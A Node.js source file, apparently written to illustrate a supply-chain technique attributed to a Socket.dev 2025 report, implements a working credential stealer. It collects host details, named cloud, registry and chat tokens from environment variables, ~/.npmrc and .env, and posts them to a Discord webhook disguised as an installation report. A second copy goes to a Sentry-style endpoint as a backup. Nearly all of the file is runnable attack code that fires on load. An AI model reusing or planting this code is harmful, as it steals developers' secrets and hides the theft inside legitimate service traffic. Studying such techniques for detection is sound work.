// Discord webhook exfiltration — Socket.dev mid-year report 2025
// Credentials are sent via Discord webhooks instead of attacker-controlled domains
// The traffic blends in with legitimate Discord API usage

const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

// Discord webhook URL — attacker creates a private channel and webhook
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567';

function collect() {
  const stolen = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    platform: process.platform,
    cwd: process.cwd()
  };

  // Harvest environment tokens
  const sensitiveEnvVars = ['NPM_TOKEN', 'GITHUB_TOKEN', 'AWS_ACCESS_KEY_ID',
    'AWS_SECRET_ACCESS_KEY', 'DISCORD_TOKEN', 'SLACK_TOKEN', 'GH_TOKEN',
    'GITLAB_TOKEN', 'DOCKER_TOKEN', 'PYPI_TOKEN'];

  stolen.env = {};
  for (const key of sensitiveEnvVars) {
    if (process.env[key]) {
      stolen.env[key] = process.env[key];
    }
  }

  // Read .npmrc for auth tokens
  try {
    stolen.npmrc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');
  } catch (e) {}

  // Read .env file if present
  try {
    stolen.dotenv = fs.readFileSync(path.join(process.cwd(), '.env'), 'utf8');
  } catch (e) {}

  return stolen;
}

function exfiltrate(data) {
  // Format as Discord embed — looks like a normal webhook message
  const payload = JSON.stringify({
    content: '**New installation report**',
    embeds: [{
      title: `Host: ${data.hostname}`,
      description: '```json\n' + JSON.stringify(data, null, 2) + '\n```',
      color: 0x00ff00
    }]
  });

  const url = new URL(WEBHOOK_URL);
  const req = https.request({
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  }, () => {});
  req.write(payload);
  req.end();
}

// Also send via Sentry-like OAST endpoint as backup
function exfiltrateViaSentry(data) {
  const sentryPayload = JSON.stringify({
    event_id: require('crypto').randomUUID(),
    message: JSON.stringify(data),
    level: 'info',
    platform: 'node'
  });

  const req = https.request({
    hostname: 'o123456.ingest.sentry.io',
    path: '/api/789/store/',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-Sentry-Auth': 'Sentry sentry_key=abc123'
    }
  }, () => {});
  req.write(sentryPayload);
  req.end();
}

const data = collect();
exfiltrate(data);
exfiltrateViaSentry(data);
